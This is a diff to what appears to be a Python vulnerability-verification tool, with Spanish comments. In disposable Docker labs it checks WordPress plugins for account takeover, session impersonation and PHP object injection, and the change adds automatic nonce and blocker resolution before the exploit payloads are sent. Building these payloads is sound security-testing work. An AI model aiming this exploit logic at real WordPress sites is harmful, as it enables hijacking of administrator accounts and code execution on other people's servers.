@@ -1245,6 +1245,8 @@ def verify_wordpress_account_takeover(
     # ejecucion puede tardar varios minutos por si solo (ver mysql_ready). 600s se quedaba corto
     # y el laboratorio se desmontaba con MySQL aun inicializando, no realmente colgado.
     companion_plugins: Optional[list] = None,
+    extra_nonce_pages: Optional[list] = None,
+    extra_setup_trigger_paths: Optional[list] = None,
 ) -> WpVerifyResult:
     """Levanta WordPress+MySQL en Docker, instala el plugin ya descargado en `plugin_source_dir`
     (debe contener `<slug>/...`), crea un usuario subscriber y un admin, inicia sesion como el
@@ -1271,19 +1273,25 @@ def verify_wordpress_account_takeover(
     lab = _Lab(_token())
     try:
         boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
-                              companion_plugins=companion_plugins)
+                              companion_plugins=companion_plugins,
+                              extra_setup_trigger_paths=extra_setup_trigger_paths)
         if boot is None:
             return res
 
+        m = (http_method or "POST").upper()
+        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        endpoint, base_params = _auto_resolve_wp_blockers(
+            boot, lab, slug, m, endpoint, base_params, id_param, res, step,
+            extra_nonce_pages=extra_nonce_pages)
+
         new_email = f"takeover-{_token()}@binoracle-lab.invalid"
         new_pass = secrets.token_urlsafe(12)
-        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        payload = dict(base_params)
         payload[id_param] = boot.admin_id
         if email_param:
             payload[email_param] = new_email
         if pass_param:
             payload[pass_param] = new_pass
-        m = (http_method or "POST").upper()
         # evidencia REAL: el payload exacto que se envio de verdad (datos de un laboratorio
         # desechable, no de un objetivo real -- seguro de mostrar tal cual).
         res.evidence.update({
@@ -1379,6 +1387,8 @@ def verify_wordpress_direct_login_as(
     parameters, id_param_hint: str = "", confirm_path: str = "/wp-admin/users.php",
     on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
     companion_plugins: Optional[list] = None,
+    extra_nonce_pages: Optional[list] = None,
+    extra_setup_trigger_paths: Optional[list] = None,
 ) -> WpVerifyResult:
     """Verifica la OTRA forma de account-takeover por missing-authorization: un plugin cuya accion
     deja a un usuario de bajo privilegio CONVERTIRSE directamente en la sesion de otro usuario
@@ -1418,7 +1428,8 @@ def verify_wordpress_direct_login_as(
     lab = _Lab(_token())
     try:
         boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
-                              companion_plugins=companion_plugins)
+                              companion_plugins=companion_plugins,
+                              extra_setup_trigger_paths=extra_setup_trigger_paths)
         if boot is None:
             return res
 
@@ -1437,12 +1448,17 @@ def verify_wordpress_direct_login_as(
                                    "pueda ver; con el valor dado no distingue nada")
             return res
 
+        m = (http_method or "GET").upper()
+        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        endpoint, base_params = _auto_resolve_wp_blockers(
+            boot, lab, slug, m, endpoint, base_params, id_param, res, step,
+            extra_nonce_pages=extra_nonce_pages)
+
         # TODAS las cookies, no solo wordpress_logged_in_*: distintos plugins suplantan por vias
         # distintas (ver docstring) -- esto es evidencia de apoyo, no el criterio de VERIFICADO.
         cookie_before = {c.name: c.value for c in boot.sub_sess.cookies}
-        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        payload = dict(base_params)
         payload[id_param] = boot.admin_id
-        m = (http_method or "GET").upper()
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
             "admin_user": boot.admin_user, "admin_id": boot.admin_id, "id_param": id_param,
@@ -3542,6 +3558,8 @@ def verify_wordpress_deserialization(
     parameters, serial_param_hint: str = "",
     on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
     companion_plugins: Optional[list] = None,
+    extra_nonce_pages: Optional[list] = None,
+    extra_setup_trigger_paths: Optional[list] = None,
 ) -> WpVerifyResult:
     """Verifica insecure deserialization (PHP Object Injection) en DOS pasos, ambos con prueba
     dura (ver deserialize_gadgets.py para el porque de este diseño):
@@ -3587,7 +3605,8 @@ def verify_wordpress_deserialization(
     lab = _Lab(_token())
     try:
         boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
-                              companion_plugins=companion_plugins)
+                              companion_plugins=companion_plugins,
+                              extra_setup_trigger_paths=extra_setup_trigger_paths)
         if boot is None:
             return res
 
@@ -3595,6 +3614,10 @@ def verify_wordpress_deserialization(
         canary_path = f"/tmp/binoracle_deser_{_token()}.txt"
         payload_obj = build_php_serialized_object(gadget, canary_path, secret)
         m = (http_method or "POST").upper()
+        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        endpoint, base_params = _auto_resolve_wp_blockers(
+            boot, lab, slug, m, endpoint, base_params, serial_param, res, step,
+            extra_nonce_pages=extra_nonce_pages)
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
             "gadget_clase": gadget.full_class_name, "gadget_metodo": gadget.magic_method,
@@ -3627,7 +3650,7 @@ def verify_wordpress_deserialization(
                      f"unserialize() reconstruyo el objeto y {gadget.magic_method} se ejecuto.")
 
         if serial_param:
-            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload = dict(base_params)
             payload[serial_param] = payload_obj
             try_send("parametro de formulario",
                      data=payload if m != "GET" else None,
@@ -3669,6 +3692,8 @@ def verify_wordpress_deserialization_custom_table(
     serial_param_hint: str = "",
     on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
     companion_plugins: Optional[list] = None,
+    extra_nonce_pages: Optional[list] = None,
+    extra_setup_trigger_paths: Optional[list] = None,
 ) -> WpVerifyResult:
     """Variante EN DOS PASOS de verify_wordpress_deserialization, apuntando al mecanismo REAL de
     object injection almacenado en WordPress -- NO la API de Options/Transients (ver
@@ -3729,7 +3754,8 @@ def verify_wordpress_deserialization_custom_table(
     lab = _Lab(_token())
     try:
         boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
-                              companion_plugins=companion_plugins)
+                              companion_plugins=companion_plugins,
+                              extra_setup_trigger_paths=extra_setup_trigger_paths)
         if boot is None:
             return res
 
@@ -3752,9 +3778,15 @@ def verify_wordpress_deserialization_custom_table(
             "store_endpoint": store_endpoint,
         })
 
+        base_store_params = dict(store_parameters) if isinstance(store_parameters, dict) else {p: "" for p in (store_parameters or [])}
+        store_endpoint, base_store_params = _auto_resolve_wp_blockers(
+            boot, lab, slug, m, store_endpoint, base_store_params, serial_param, res, step,
+            extra_nonce_pages=extra_nonce_pages)
+        res.evidence["store_endpoint"] = store_endpoint
+
         step(f"PASO 1/2 -- almacenando el objeto serializado via {m} {store_endpoint} (sesion "
              f"de '{boot.sub_user}', bajo privilegio)...")
-        payload = dict(store_parameters) if isinstance(store_parameters, dict) else {p: "" for p in (store_parameters or [])}
+        payload = base_store_params
         tried_store = []
         stored_ok = False
 
